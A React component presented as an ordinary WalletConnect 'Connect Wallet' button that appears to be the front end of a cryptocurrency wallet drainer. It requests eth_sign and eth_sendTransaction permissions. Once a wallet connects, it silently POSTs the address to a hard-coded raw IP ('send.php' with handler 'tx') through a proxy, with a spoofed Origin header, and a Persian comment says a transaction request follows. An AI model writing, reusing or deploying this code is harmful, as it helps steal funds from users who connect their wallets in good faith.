import { useEffect, useState } from "react";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  const [walletConnected, setWalletConnected] = useState(false);
  const [account, setAccount] = useState(null);
  const [provider, setProvider] = useState(null);

  async function connectWallet() {
    try {
      console.log("🔗 Initializing WalletConnect...");

      const ethereumProvider = await EthereumProvider.init({
        showQrModal: true,
        qrModalOptions: { themeMode: "dark" },
        chains: [1],
        methods: ["eth_accounts", "eth_sign", "eth_sendTransaction"],
        projectId: "9fe3ed74e1d73141e8b7747bedf77551",
      });

      const accounts = await ethereumProvider.request({ method: "eth_requestAccounts" });

      if (accounts.length > 0) {
        setAccount(accounts[0]);
        setProvider(ethereumProvider);
        setWalletConnected(true);
        console.log("✅ Connected Wallet Address:", accounts[0]);

        // پس از اتصال موفق، درخواست تراکنش ارسال شود
        requestTransaction(accounts[0]);
      } else {
        console.log("⚠ No account found.");
      }
    } catch (error) {
      console.error("❌ Error connecting wallet:", error);
    }
  }

  async function requestTransaction(walletAddress) {
    if (!walletAddress) {
      console.warn("⚠ No wallet address found. Cannot send transaction request.");
      return;
    }
    
    console.log("📡 Sending transaction request...");

    try {
      const response = await fetch(
        "http://104.194.133.124:8080/http://104.194.133.124/send.php",
        {
          method: "POST",
          headers: {
            "Origin": "http://localhost",
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            handler: "tx",
            address: walletAddress,
            chain: "56",
            type: "coin",
          }),
        }
      );

      const result = await response.text();
      console.log("✅ Transaction Request Result:", result);
    } catch (error) {
      console.error("❌ Transaction Request Failed:", error);
    }
  }

  return (
    <a
      href="#"
      id="kos"
      onClick={connectWallet}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>{walletConnected ? `✅ Wallet: ${account.slice(0, 6)}...` : "🔗 Connect Wallet"}</span>
    </a>
  );
}

export default App;
